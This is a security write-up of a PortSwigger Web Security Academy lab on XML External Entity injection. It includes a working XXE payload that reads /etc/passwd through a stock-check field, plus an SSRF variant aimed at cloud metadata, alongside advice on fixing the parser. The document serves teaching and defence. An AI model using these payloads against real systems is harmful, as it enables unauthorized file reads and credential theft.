# XML External Entity (XXE) Injection — PortSwigger Web Security Academy

> Writeup covering XXE to retrieve files (OWASP Top 10 — A05).
> Author: Yuri Vinhote · Tool: Burp Suite

XXE happens when an application parses XML input and the XML parser is configured
to resolve **external entities**. An attacker defines an entity that points to a
resource — a local file, or an internal/external URL — and the parser dutifully
fetches it, embedding the result wherever the entity is referenced. It yields
arbitrary file read and, because the parser can fetch URLs, **SSRF** as well.

---

## Exploiting XXE to retrieve files

The stock-check feature accepted an **XML** body and echoed a field back in the
response. The parser resolved external entities, so a `SYSTEM` entity pointing at
a local file was read and returned.

**Original request body**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Attack**
1. Declared a DOCTYPE with an external entity pointing to the target file, and
   referenced it inside the field that is reflected back:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
   ```
2. Sent it (Burp Repeater). The parser replaced `&xxe;` with the contents of
   `/etc/passwd`; the app then tried to treat that text as a product ID and
   returned `400 Bad Request — "Invalid product ID: root:x:0:0:root:/root:/bin/bash..."`.
   The error message **was** the exfiltrated file — the whole user list leaked.

**Impact** — Arbitrary server-side file read. `/etc/passwd` is the proof; the real
targets are config files with credentials, source code, and private keys.

**Fix** — Disable DTDs and external entity resolution in the XML parser (the
single most effective control). If DTDs are needed, disable external entities and
entity expansion specifically. Prefer parsers that are secure by default.

---

## Beyond file read — the XXE family (concept)

- **XXE → SSRF**: point the entity at a URL instead of a file
  (`SYSTEM "http://169.254.169.254/latest/meta-data/"`) to make the server reach
  internal systems or cloud metadata.
- **Blind XXE (out-of-band)**: when the response isn't reflected, use an external
  DTD on an attacker server and OAST to exfiltrate data via a crafted URL — same
  out-of-band principle as blind SSRF.
- **XInclude**: when you don't control the whole document but can inject into one
  value, `<xi:include>` can still pull in a file.

---

## Key takeaway

XXE is a parser-configuration bug: the danger isn't XML itself, it's a parser
left resolving external entities. One injected DOCTYPE turns a data field into a
window onto the server's filesystem and internal network. The fix is
configuration, not input filtering — disable DTDs/external entities at the parser.

Relevant to enterprise/ERP and integration work, where XML is everywhere:
SOAP WebServices, NF-e / fiscal document processing, banking integrations, and
EDI feeds. Any endpoint that parses XML from an external party is a candidate,
and a developer who built those integrations knows exactly where the XML enters.

*Labs completed on PortSwigger Web Security Academy — authorized lab environment only.*
